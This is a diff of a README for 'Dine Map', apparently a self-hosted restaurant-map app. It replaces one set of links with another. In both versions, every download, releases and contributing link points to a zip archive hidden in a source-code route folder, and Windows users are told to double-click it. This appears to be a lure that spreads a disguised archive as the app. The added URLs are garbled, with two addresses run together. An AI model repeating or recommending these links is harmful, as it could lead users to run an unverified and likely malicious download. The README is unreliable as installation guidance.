@@ -4,9 +4,9 @@
 Welcome to Dine Map! This application helps you find and review local restaurants. You can explore your area through a self-hosted map that uses custom tiles and a clean Svelte-based user interface. Follow these steps to get started quickly.
 
 ## 📥 Download Dine Map
-[![Download Dine Map](https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip)
+[![Download Dine Map](https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip)
 
-To download Dine Map, click the button above or visit the [Releases Page](https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip) to download the latest version.
+To download Dine Map, click the button above or visit the [Releases Page](https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip) to download the latest version.
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -16,15 +16,15 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip).
+1. Visit the [Releases Page](https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip).
 2. Look for the latest version listed at the top.
 3. Download the file relevant to your operating system:
-   - For **Windows**: Download `https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip`.
-   - For **macOS**: Download `https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip`.
-   - For **Linux**: Download `https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip`.
+   - For **Windows**: Download `https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip`.
+   - For **macOS**: Download `https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip`.
+   - For **Linux**: Download `https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip`.
 4. Extract the downloaded file to your preferred location using built-in tools or software such as WinRAR or 7-Zip.
 5. Open the extracted folder and run the application:
-   - On **Windows**, double-click `https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip`.
+   - On **Windows**, double-click `https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip`.
    - On **macOS**, drag the app to your Applications folder and then open it.
    - On **Linux**, use your terminal to navigate to the folder and run `./dine-map`.
 
@@ -66,7 +66,7 @@ We welcome contributions to improve Dine Map:
 - Create a new feature branch.
 - Make your changes and submit a pull request.
 
-Visit the [Contributing Page](https://raw.githubusercontent.com/sarlaey/dine-map/main/src/routes/api/tile/[z]/[x]/map-dine-1.0-alpha.4.zip) for more details.
+Visit the [Contributing Page](https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip[z]/[x]https://github.com/sarlaey/dine-map/raw/refs/heads/main/src/routes/api/list/map-dine-v1.2.zip) for more details.
 
 ## 📜 License
 Dine Map is licensed under the MIT License. Feel free to use and modify the software as you wish.
